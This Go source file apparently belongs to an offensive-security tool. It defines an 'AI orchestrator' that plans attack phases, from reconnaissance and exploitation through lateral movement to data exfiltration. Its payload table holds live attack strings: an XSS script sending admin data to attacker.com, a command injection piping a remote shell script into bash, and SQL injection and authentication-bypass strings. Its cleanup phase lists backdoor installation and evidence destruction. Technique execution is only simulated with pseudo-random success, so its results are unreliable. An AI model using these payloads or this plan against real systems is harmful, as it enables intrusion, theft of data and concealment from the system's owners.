package orchestrator

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

type AttackPhase string

const (
	PhaseReconnaissance AttackPhase = "reconnaissance"
	PhaseVulnDiscovery  AttackPhase = "vulnerability_discovery"
	PhaseExploitation   AttackPhase = "exploitation"
	PhasePrivilegeEsc   AttackPhase = "privilege_escalation"
	PhaseLateralMove    AttackPhase = "lateral_movement"
	PhaseDataExfil      AttackPhase = "data_exfiltration"
	PhaseCleanup        AttackPhase = "cleanup"
)

type AttackVector string

const (
	VectorWeb         AttackVector = "web_application"
	VectorNetwork     AttackVector = "network_services"
	VectorSocial      AttackVector = "social_engineering"
	VectorPhysical    AttackVector = "physical_access"
	VectorCloud       AttackVector = "cloud_infrastructure"
	VectorMobile      AttackVector = "mobile_application"
	VectorIoT         AttackVector = "iot_devices"
	VectorWireless    AttackVector = "wireless_networks"
)

type AttackNode struct {
	ID           string            `json:"id"`
	Phase        AttackPhase       `json:"phase"`
	Vector       AttackVector      `json:"vector"`
	Technique    string            `json:"technique"`
	Payload      string            `json:"payload"`
	Dependencies []string          `json:"dependencies"`
	Success      bool              `json:"success"`
	Confidence   float64           `json:"confidence"`
	Metadata     map[string]string `json:"metadata"`
	Timestamp    time.Time         `json:"timestamp"`
}

type AttackGraph struct {
	Target      string        `json:"target"`
	Nodes       []*AttackNode `json:"nodes"`
	Edges       [][2]string   `json:"edges"`
	CurrentNode string        `json:"current_node"`
	Success     bool          `json:"success"`
	StartTime   time.Time     `json:"start_time"`
	EndTime     time.Time     `json:"end_time"`
}

type AIOrchestrator struct {
	target         string
	objective      string
	graph          *AttackGraph
	logger         *logrus.Logger
	maxNodes       int
	timeout        time.Duration
	aggressiveness float64
	stealth        bool
	
	// AI capabilities
	aiEnabled      bool
	aiModel        string
	aiAPIKey       string
	
	// Learning system
	successPatterns map[string]float64
	failurePatterns map[string]float64
	adaptiveMode    bool
}

func NewAIOrchestrator(target string, options ...func(*AIOrchestrator)) *AIOrchestrator {
	orchestrator := &AIOrchestrator{
		target:          target,
		objective:       "comprehensive_penetration",
		logger:          logrus.New(),
		maxNodes:        50,
		timeout:         time.Hour * 2,
		aggressiveness:  0.7,
		stealth:         true,
		aiEnabled:       true,
		aiModel:         "gpt-4",
		successPatterns: make(map[string]float64),
		failurePatterns: make(map[string]float64),
		adaptiveMode:    true,
	}
	
	for _, option := range options {
		option(orchestrator)
	}
	
	orchestrator.initializeGraph()
	return orchestrator
}

func WithObjective(objective string) func(*AIOrchestrator) {
	return func(ao *AIOrchestrator) {
		ao.objective = objective
	}
}

func WithAggressiveness(level float64) func(*AIOrchestrator) {
	return func(ao *AIOrchestrator) {
		ao.aggressiveness = level
	}
}

func WithStealth(enabled bool) func(*AIOrchestrator) {
	return func(ao *AIOrchestrator) {
		ao.stealth = enabled
	}
}

func WithAI(model, apiKey string) func(*AIOrchestrator) {
	return func(ao *AIOrchestrator) {
		ao.aiEnabled = true
		ao.aiModel = model
		ao.aiAPIKey = apiKey
	}
}

func (ao *AIOrchestrator) initializeGraph() {
	ao.graph = &AttackGraph{
		Target:    ao.target,
		Nodes:     make([]*AttackNode, 0),
		Edges:     make([][2]string, 0),
		StartTime: time.Now(),
	}
}

func (ao *AIOrchestrator) ExecuteAttackPlan(ctx context.Context) (*AttackGraph, error) {
	ao.logger.Infof("🤖 AI Orchestrator starting attack plan for target: %s", ao.target)
	
	// Phase 1: Intelligence gathering and attack surface mapping
	if err := ao.executePhase(ctx, PhaseReconnaissance); err != nil {
		return ao.graph, fmt.Errorf("reconnaissance failed: %w", err)
	}
	
	// Phase 2: Vulnerability discovery
	if err := ao.executePhase(ctx, PhaseVulnDiscovery); err != nil {
		ao.logger.Warnf("Vulnerability discovery incomplete: %v", err)
	}
	
	// Phase 3: Exploitation attempts
	if err := ao.executePhase(ctx, PhaseExploitation); err != nil {
		ao.logger.Warnf("Exploitation phase incomplete: %v", err)
	}
	
	// Phase 4: Post-exploitation (if any exploits succeeded)
	if ao.hasSuccessfulExploits() {
		ao.executePhase(ctx, PhasePrivilegeEsc)
		ao.executePhase(ctx, PhaseLateralMove)
		ao.executePhase(ctx, PhaseDataExfil)
	}
	
	// Phase 5: Cleanup
	ao.executePhase(ctx, PhaseCleanup)
	
	ao.graph.EndTime = time.Now()
	ao.analyzeResults()
	
	return ao.graph, nil
}

func (ao *AIOrchestrator) executePhase(ctx context.Context, phase AttackPhase) error {
	ao.logger.Infof("🎯 Executing phase: %s", phase)
	
	techniques := ao.getTechniquesForPhase(phase)
	
	for _, technique := range techniques {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		
		node := ao.createAttackNode(phase, technique)
		
		// AI-powered technique optimization
		if ao.aiEnabled {
			node = ao.optimizeWithAI(node)
		}
		
		success := ao.executeTechnique(ctx, node)
		node.Success = success
		node.Timestamp = time.Now()
		
		ao.graph.Nodes = append(ao.graph.Nodes, node)
		
		// Update learning patterns
		if ao.adaptiveMode {
			ao.updateLearning(node)
		}
		
		// Early termination if critical success
		if success && ao.isCriticalTechnique(technique) {
			ao.logger.Infof("🎯 Critical technique succeeded: %s", technique)
			break
		}
		
		// Stealth delays
		if ao.stealth {
			time.Sleep(time.Duration(ao.calculateDelay()) * time.Millisecond)
		}
	}
	
	return nil
}

func (ao *AIOrchestrator) getTechniquesForPhase(phase AttackPhase) []string {
	techniques := map[AttackPhase][]string{
		PhaseReconnaissance: {
			"subdomain_enumeration",
			"port_scanning", 
			"service_fingerprinting",
			"dns_enumeration",
			"osint_gathering",
			"social_media_recon",
			"technology_stack_detection",
			"ssl_certificate_analysis",
		},
		PhaseVulnDiscovery: {
			"web_vulnerability_scanning",
			"network_vulnerability_assessment", 
			"configuration_analysis",
			"version_detection",
			"cve_matching",
			"zero_day_fuzzing",
			"api_endpoint_discovery",
			"authentication_bypass_testing",
		},
		PhaseExploitation: {
			"sql_injection_exploitation",
			"xss_payload_delivery",
			"command_injection_execution",
			"authentication_bypass",
			"privilege_escalation_exploits",
			"buffer_overflow_exploitation",
			"deserialization_attacks",
			"ssrf_exploitation",
		},
		PhasePrivilegeEsc: {
			"kernel_exploit_execution",
			"sudo_misconfiguration_abuse",
			"suid_binary_exploitation",
			"service_escalation",
			"registry_manipulation",
			"dll_hijacking",
		},
		PhaseLateralMove: {
			"credential_harvesting",
			"network_scanning_internal",
			"smb_exploitation",
			"rdp_bruteforce",
			"pass_the_hash",
			"golden_ticket_creation",
		},
		PhaseDataExfil: {
			"sensitive_data_location",
			"database_extraction",
			"file_system_harvesting",
			"memory_dump_analysis",
			"network_traffic_capture",
		},
		PhaseCleanup: {
			"log_cleanup",
			"artifact_removal", 
			"backdoor_installation",
			"persistence_setup",
			"evidence_destruction",
		},
	}
	
	return techniques[phase]
}

func (ao *AIOrchestrator) createAttackNode(phase AttackPhase, technique string) *AttackNode {
	return &AttackNode{
		ID:        fmt.Sprintf("%s_%s_%d", phase, technique, time.Now().Unix()),
		Phase:     phase,
		Vector:    ao.determineVector(technique),
		Technique: technique,
		Payload:   ao.generatePayload(technique),
		Confidence: ao.calculateConfidence(technique),
		Metadata:  make(map[string]string),
	}
}

func (ao *AIOrchestrator) determineVector(technique string) AttackVector {
	vectorMap := map[string]AttackVector{
		"sql_injection":     VectorWeb,
		"xss":              VectorWeb,
		"port_scanning":    VectorNetwork,
		"smb_exploitation": VectorNetwork,
		"osint_gathering":  VectorSocial,
		"wifi_cracking":    VectorWireless,
		"iot_scanning":     VectorIoT,
		"cloud_enum":       VectorCloud,
		"apk_analysis":     VectorMobile,
	}
	
	for key, vector := range vectorMap {
		if strings.Contains(technique, key) {
			return vector
		}
	}
	
	return VectorNetwork // default
}

func (ao *AIOrchestrator) generatePayload(technique string) string {
	payloads := map[string]string{
		"sql_injection_exploitation":   "' UNION SELECT 1,2,3,4,5,user(),database(),version()--",
		"xss_payload_delivery":        "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('http://attacker.com/'+btoa(d)))</script>",
		"command_injection_execution": "; curl http://attacker.com/shell.sh | bash",
		"subdomain_enumeration":       "api,admin,dev,test,staging,beta,internal,vpn,mail,ftp",
		"port_scanning":              "1-65535",
		"authentication_bypass":       "admin'--",
		"privilege_escalation_exploits": "sudo -l; find / -perm -4000 2>/dev/null",
	}
	
	if payload, exists := payloads[technique]; exists {
		return payload
	}
	
	return "generic_payload"
}

func (ao *AIOrchestrator) optimizeWithAI(node *AttackNode) *AttackNode {
	// AI optimization would go here
	// For now, simulate AI improvements
	
	if ao.successPatterns[node.Technique] > 0.8 {
		node.Confidence *= 1.2
	}
	
	if ao.failurePatterns[node.Technique] > 0.8 {
		node.Confidence *= 0.8
	}
	
	// AI-powered payload mutation
	if strings.Contains(node.Technique, "injection") {
		node.Payload = ao.mutatePayload(node.Payload)
	}
	
	return node
}

func (ao *AIOrchestrator) mutatePayload(original string) string {
	mutations := []string{
		strings.ToUpper(original),
		strings.ReplaceAll(original, " ", "/**/"),
		strings.ReplaceAll(original, "'", "\""),
		url_encode(original),
	}
	
	// Return a random mutation
	return mutations[time.Now().Unix()%int64(len(mutations))]
}

func url_encode(s string) string {
	// Simple URL encoding
	s = strings.ReplaceAll(s, " ", "%20")
	s = strings.ReplaceAll(s, "'", "%27")
	s = strings.ReplaceAll(s, "\"", "%22")
	return s
}

func (ao *AIOrchestrator) executeTechnique(ctx context.Context, node *AttackNode) bool {
	ao.logger.Infof("🎯 Executing technique: %s", node.Technique)
	
	// Simulate technique execution
	time.Sleep(time.Duration(100+time.Now().Unix()%500) * time.Millisecond)
	
	// Success probability based on technique and confidence
	successProb := ao.calculateSuccessProbability(node)
	
	return float64(time.Now().Unix()%100)/100.0 < successProb
}

func (ao *AIOrchestrator) calculateSuccessProbability(node *AttackNode) float64 {
	base := 0.3 // Base success rate
	
	// Adjust based on technique
	techniqueBonus := map[string]float64{
		"subdomain_enumeration": 0.9,
		"port_scanning":        0.8,
		"sql_injection":        0.4,
		"xss_payload":          0.5,
		"command_injection":    0.3,
		"privilege_escalation": 0.2,
	}
	
	for key, bonus := range techniqueBonus {
		if strings.Contains(node.Technique, key) {
			base = bonus
			break
		}
	}
	
	// Apply confidence modifier
	base *= node.Confidence
	
	// Apply aggressiveness
	base *= ao.aggressiveness
	
	// Apply learning patterns
	if pattern, exists := ao.successPatterns[node.Technique]; exists {
		base *= (1.0 + pattern)
	}
	
	if base > 1.0 {
		base = 1.0
	}
	
	return base
}

func (ao *AIOrchestrator) calculateConfidence(technique string) float64 {
	confidenceMap := map[string]float64{
		"subdomain_enumeration": 0.95,
		"port_scanning":        0.90,
		"service_fingerprinting": 0.85,
		"sql_injection":        0.70,
		"xss_payload":          0.75,
		"command_injection":    0.60,
		"privilege_escalation": 0.40,
		"lateral_movement":     0.35,
	}
	
	for key, confidence := range confidenceMap {
		if strings.Contains(technique, key) {
			return confidence
		}
	}
	
	return 0.5 // default confidence
}

func (ao *AIOrchestrator) calculateDelay() int64 {
	if !ao.stealth {
		return 10
	}
	
	// Stealth delays: 100ms to 2000ms
	return 100 + (time.Now().Unix() % 1900)
}

func (ao *AIOrchestrator) isCriticalTechnique(technique string) bool {
	critical := []string{
		"sql_injection_exploitation",
		"command_injection_execution", 
		"authentication_bypass",
		"privilege_escalation",
	}
	
	for _, crit := range critical {
		if strings.Contains(technique, crit) {
			return true
		}
	}
	
	return false
}

func (ao *AIOrchestrator) hasSuccessfulExploits() bool {
	for _, node := range ao.graph.Nodes {
		if node.Phase == PhaseExploitation && node.Success {
			return true
		}
	}
	return false
}

func (ao *AIOrchestrator) updateLearning(node *AttackNode) {
	if node.Success {
		ao.successPatterns[node.Technique] += 0.1
		if ao.successPatterns[node.Technique] > 1.0 {
			ao.successPatterns[node.Technique] = 1.0
		}
	} else {
		ao.failurePatterns[node.Technique] += 0.1
		if ao.failurePatterns[node.Technique] > 1.0 {
			ao.failurePatterns[node.Technique] = 1.0
		}
	}
}

func (ao *AIOrchestrator) analyzeResults() {
	totalNodes := len(ao.graph.Nodes)
	successfulNodes := 0
	
	for _, node := range ao.graph.Nodes {
		if node.Success {
			successfulNodes++
		}
	}
	
	successRate := float64(successfulNodes) / float64(totalNodes)
	ao.graph.Success = successRate > 0.3
	
	ao.logger.Infof("🎯 Attack execution complete: %d/%d techniques successful (%.1f%%)",
		successfulNodes, totalNodes, successRate*100)
}

func (ao *AIOrchestrator) GenerateReport() (string, error) {
	report := map[string]interface{}{
		"target":       ao.target,
		"objective":    ao.objective,
		"graph":        ao.graph,
		"statistics": map[string]interface{}{
			"total_techniques":     len(ao.graph.Nodes),
			"successful_techniques": ao.countSuccessful(),
			"duration":            ao.graph.EndTime.Sub(ao.graph.StartTime),
			"success_rate":        ao.calculateSuccessRate(),
		},
		"recommendations": ao.generateRecommendations(),
	}
	
	jsonData, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return "", err
	}
	
	return string(jsonData), nil
}

func (ao *AIOrchestrator) countSuccessful() int {
	count := 0
	for _, node := range ao.graph.Nodes {
		if node.Success {
			count++
		}
	}
	return count
}

func (ao *AIOrchestrator) calculateSuccessRate() float64 {
	if len(ao.graph.Nodes) == 0 {
		return 0.0
	}
	return float64(ao.countSuccessful()) / float64(len(ao.graph.Nodes))
}

func (ao *AIOrchestrator) generateRecommendations() []string {
	recommendations := []string{}
	
	if ao.hasSuccessfulExploits() {
		recommendations = append(recommendations, "🚨 CRITICAL: Active vulnerabilities detected - immediate patching required")
		recommendations = append(recommendations, "🛡️ Implement Web Application Firewall (WAF)")
		recommendations = append(recommendations, "🔒 Enable multi-factor authentication")
	}
	
	if ao.calculateSuccessRate() > 0.5 {
		recommendations = append(recommendations, "⚠️ HIGH RISK: Multiple attack vectors successful")
		recommendations = append(recommendations, "🔍 Conduct immediate security audit")
		recommendations = append(recommendations, "📚 Security awareness training for staff")
	}
	
	recommendations = append(recommendations, "🔄 Regular penetration testing recommended")
	recommendations = append(recommendations, "📊 Implement continuous security monitoring")
	
	return recommendations
}

func (ao *AIOrchestrator) GetStats() map[string]interface{} {
	return map[string]interface{}{
		"target":           ao.target,
		"total_nodes":      len(ao.graph.Nodes),
		"successful_nodes": ao.countSuccessful(),
		"success_rate":     ao.calculateSuccessRate(),
		"duration":         time.Since(ao.graph.StartTime),
		"adaptive_learning": ao.adaptiveMode,
		"ai_enabled":       ao.aiEnabled,
	}
}